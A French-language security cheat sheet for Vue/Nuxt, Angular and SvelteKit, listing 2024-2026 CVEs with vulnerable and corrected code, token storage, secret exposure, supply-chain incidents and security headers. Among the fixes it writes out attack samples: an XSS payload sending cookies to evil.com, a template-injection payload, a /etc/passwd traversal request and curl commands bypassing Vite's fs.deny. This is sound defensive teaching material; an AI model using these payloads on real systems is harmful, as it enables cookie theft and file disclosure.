# Sécurité Frontend SPA (Vue/Angular/Svelte) — Condensé 2024-2026

## CVEs Vue.js / Nuxt

| CVE | Composant | CVSS | Type | Fix |
|-----|-----------|------|------|-----|
| CVE-2025-52662 | Nuxt DevTools | Medium | XSS → path traversal → RCE (réécriture config via WebSocket) | DevTools ≥ 2.6.4 |
| CVE-2024-34344 | Nuxt | 8.6 | Path Traversal / RCE | Nuxt ≥ 3.12.4 |
| CVE-2024-34343 | Nuxt navigateTo | 5.1 | XSS javascript: URI | Patché |
| CVE-2025-27415 | Nuxt 3 | Medium | Cache-Poisoned DoS | Patché |
| CVE-2024-6783 | Vue 2 template-compiler | 4.2 | XSS via Prototype Pollution | Vue 3 non affecté |

## CVEs Angular

| CVE | Composant | CVSS | Type | Fix |
|-----|-----------|------|------|-----|
| CVE-2026-22610 | @angular/compiler | 8.5 | XSS via SVG `<script>` href (`data:text/javascript`) | 19.2.18 / 20.3.16 / 21.0.7 |
| CVE-2025-66412 | @angular/compiler | 8.5 | XSS via SVG animation/MathML | 19.2.17 / 20.3.15 / 21.0.2 |
| CVE-2025-66035 | @angular/common | 7.7 | Fuite token XSRF via URL `//attacker.com` (traité same-origin) | 19.2.16 / 20.3.14 / 21.0.1 |
| CVE-2025-59052 | @angular/platform-server | 7.1 | Race condition SSR — injecteur global → fuite tokens cross-requêtes | 18.2.14 / 19.2.15 / 20.3.0 |

## CVEs SvelteKit / Svelte

| CVE | Package | Sévérité | Type | Fix |
|-----|---------|----------|------|-----|
| CVE-2026-22803 | @sveltejs/kit | High | DoS mémoire (remote functions) | kit ≥ 2.49.5 |
| CVE-2026-22775/74 | devalue | High | DoS mémoire (parse) | devalue ≥ 5.6.2 |
| CVE-2025-67647 | kit + adapter-node | High | DoS + SSRF via prerendering | kit ≥ 2.49.5 |
| CVE-2025-32388 | @sveltejs/kit | Medium | XSS via searchParams non échappés dans boot script | Patché |
| CVE-2025-15265 | svelte | Medium | XSS via hydratable | svelte ≥ 5.46.4 |
| CVE-2024-45047 | svelte | Medium | mXSS dans `<noscript>` | svelte ≥ 4.2.19 |
| CVE-2024-45811 | vite | Medium | Bypass server.fs.deny via `?import&raw` → lecture fichiers système | vite ≥ 5.4.6 |
| CVE-2024-45812 | vite | Medium | DOM Clobbering XSS | vite ≥ 5.4.6 |

**CVE-2025-32388 — particularité :** lire un searchParam suffit pour déclencher le XSS — sans l'afficher. Visiter `?</script><script>window.pwned=1</script>` provoque l'exécution.

---

## XSS via rendu HTML brut (pattern commun aux 3 frameworks)

```vue
<!-- Vue — VULNÉRABLE -->
<div v-html="userComment"></div>
<!-- Payload : <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)"> -->

<!-- Vue — CORRIGÉ -->
<div v-html="sanitized"></div>
<!-- sanitized = computed(() => DOMPurify.sanitize(userComment.value)) -->
```

```svelte
<!-- Svelte — VULNÉRABLE -->
<div>{@html userComment}</div>
<!-- Svelte — CORRIGÉ -->
<div>{@html DOMPurify.sanitize(userComment)}</div>
<!-- Linter : eslint svelte/no-at-html-tags -->
```

Angular : `bypassSecurityTrustHtml(userInput)` sur input utilisateur = XSS direct.
```typescript
// CORRIGÉ : DOMPurify.sanitize(userInput) ou sanitizer.sanitize(SecurityContext.HTML, userInput)
```

---

## Injection de template = RCE navigateur

```js
// Vue — VULNÉRABLE : template depuis API
const DynamicComponent = { template: templateFromApi }
// Payload : {{ constructor.constructor('alert(document.cookie)')() }}
// CORRIGÉ : build runtime-only (sans compilateur), ne jamais activer runtimeCompiler: true
```

```typescript
// Angular — VULNÉRABLE : JIT avec template utilisateur
Component({ template: userTemplate })(class {})
// CORRIGÉ : compilation AOT (par défaut Angular CLI) — ne jamais concaténer input utilisateur
```

---

## Contamination cross-requêtes SSR (invisible en dev local)

**Nuxt :**
```ts
// VULNÉRABLE : ref() niveau module = partagé entre TOUTES les requêtes
const cartItems = ref<CartItem[]>([])  // données User A → User B

// CORRIGÉ : useState() crée un état isolé par requête
const cartItems = useState<CartItem[]>('cart-items', () => [])
```

**Pinia — tokens sérialisés dans le HTML :**
```ts
// VULNÉRABLE : sessionToken apparaît dans __NUXT_DATA__ du HTML
state: () => ({ sessionToken: '' })

// CORRIGÉ
sessionToken: skipHydrate(sessionToken)  // NON sérialisé
```

**Angular CVE-2025-59052 :** injecteur de plateforme stocké comme variable globale de module → tokens cross-requêtes. Fix : services scopés par requête.

**Svelte :**
```typescript
// VULNÉRABLE : singleton serveur
let cachedUser: User | null = null;  // données User 1 → tous les suivants

// CORRIGÉ : pas de cache, fresh par requête
export async function load({ fetch }) {
  return { user: await (await fetch('/api/user')).json() };
}
// Pour état réactif : Context API (setContext/getContext), pas stores de module
```

---

## Authentification SPA

### Stockage tokens

| Mécanisme | Lisible par XSS | CSRF | Recommandation |
|-----------|:-:|:-:|---|
| localStorage / sessionStorage | OUI | Non | EVITER |
| Cookie httpOnly+Secure+SameSite | NON | Atténué | RECOMMANDE |
| Variable mémoire | Non | Non | Access token court uniquement |

**Pattern BFF (recommandation IETF RFC) :** BFF = client OAuth confidentiel côté serveur, refresh token en cookie httpOnly, access token (15min) en mémoire uniquement. XSS ne peut pas exfiltrer de token.

### JWT — attaque de confusion d'algorithme
```javascript
// VULNÉRABLE : accepte l'algo du header
jwt.verify(token, publicKey)
// Exploit : signer avec la clé publique en HS256 → serveur valide

// CORRIGÉ
jwt.verify(token, publicKey, { algorithms: ['RS256'] })
```
CVE associés : CVE-2023-48223 (fast-jwt), CVE-2023-48238 (json-web-token).

### OAuth 2.1 — implicit flow supprimé (RFC 9700, jan 2025)
PKCE obligatoire. Générateur de code_verifier : `crypto.getRandomValues()` uniquement (jamais `Math.random()`), méthode `S256`, verifier ≥43 caractères.

### CSRF — limites de SameSite=Lax
- Ne bloque pas GET top-level, fenêtre Lax+POST 2min Chrome, WebSocket non protégé, Firefox/Safari ne défaultent pas à Lax
- Double-submit cookie en complément : comparer `x-xsrf-token` header vs cookie `XSRF-TOKEN`

---

## Path traversal — server routes Nuxt (H3/Nitro)

```ts
// VULNÉRABLE : GET /api/files/..%2F..%2Fetc%2Fpasswd
const name = getRouterParam(event, 'name')
return readFileSync(path.join('/uploads', name!), 'utf-8')

// CORRIGÉ
const { name } = await getValidatedRouterParams(event, z.object({
  name: z.string().regex(/^[a-zA-Z0-9_-]+\.[a-z]+$/)
}).parse)
const filePath = path.resolve('/uploads', path.basename(name))
if (!filePath.startsWith(path.resolve('/uploads')))
  throw createError({ statusCode: 400 })
```

---

## CVE-2024-45811 — bypass Vite server.fs.deny
```bash
curl "http://localhost:5173/@fs/tmp/secret.txt"           # → 403
curl "http://localhost:5173/@fs/tmp/secret.txt?import&raw" # → contenu complet !
```
Expose `.env`, clés privées, code source. Ne jamais exposer le serveur dev Vite au réseau.

---

## Exposition de secrets

### Source maps en production = code source public
```javascript
// Vite
export default defineConfig({ build: { sourcemap: false } })  // ou 'hidden' pour Sentry
// Angular : "sourceMap": false dans angular.json production config
// Webpack : devtool: false
```
Incident GETTR : source maps exposaient endpoint password-reset sans auth + clés Stripe.

### Variables d'env embarquées dans le bundle

| Framework | Préfixe client (embarqué) | Serveur uniquement |
|-----------|:---:|:---:|
| Vite | `VITE_*` | sans préfixe |
| Next.js | `NEXT_PUBLIC_*` | sans préfixe |
| SvelteKit | `PUBLIC_*` | sans préfixe |

Incident Sprocket : credentials AWS + tokens GitHub + JWTs Supabase extraits de bundles `VITE_*` → compromission CI/CD complète.

### GraphQL introspection en prod = schéma API complet exposé
```javascript
introspection: process.env.NODE_ENV !== 'production',
validationRules: [depthLimit(5), createComplexityLimitRule(1000)]
```

---

## Supply chain

### Shai-Hulud (8 sept 2025) — 2,6 milliards téléchargements/semaine compromis
- Phishing mainteneur (faux `npmjs.help`) + TOTP capturé en temps réel → **18+ packages** : chalk, debug, ansi-styles
- Crypto-stealer `window.ethereum`. Vague 2 (nov 2025) : 796+ packages + fallback `rm -rf ~/`

```bash
npm ci                          # lockfile strict (jamais npm install en CI)
npm config set ignore-scripts true
npx socket scan                 # scanner dépendances
```

### Polyfill.io (fév–juin 2024) — 384 773 sites
Funnull (front nord-coréen) acquiert le domaine → redirections malveillantes mobile. SRI obligatoire pour toute ressource CDN :
```html
<script src="https://cdn.example.com/lib.js" integrity="sha384-HASH" crossorigin="anonymous"></script>
```

### Plugin Vite/Webpack malveillant = RCE build + vol env vars
`vite-plugin-react-extend` (typosquatting) = suppression récursive. Un plugin a accès complet FS + env vars + réseau + code de sortie.

---

## Headers de sécurité

### CSP avec nonce + strict-dynamic
```javascript
const nonce = crypto.randomBytes(16).toString('base64');
`script-src 'self' 'nonce-${nonce}' 'strict-dynamic'; frame-ancestors 'none'; base-uri 'self';`
// Angular : ngCspNonce v16+ | Vue : build runtime-only | SvelteKit : kit.csp mode auto
```

### Trusted Types — Angular v11+, Chrome/Edge 83+
```javascript
const policy = trustedTypes.createPolicy('myPolicy', { createHTML: (i) => DOMPurify.sanitize(i) });
element.innerHTML = policy.createHTML(userInput);  // OK
element.innerHTML = userInput;                     // TypeError (75% vulns Google = XSS)
```

### Fetch Metadata — CSRF sans token (headers non modifiables JS, ~97.6% navigateurs)
```javascript
const site = req.headers['sec-fetch-site'];
if (['same-origin','same-site','none'].includes(site)) return next();
// GET top-level cross-site : autoriser | tout le reste : 403
```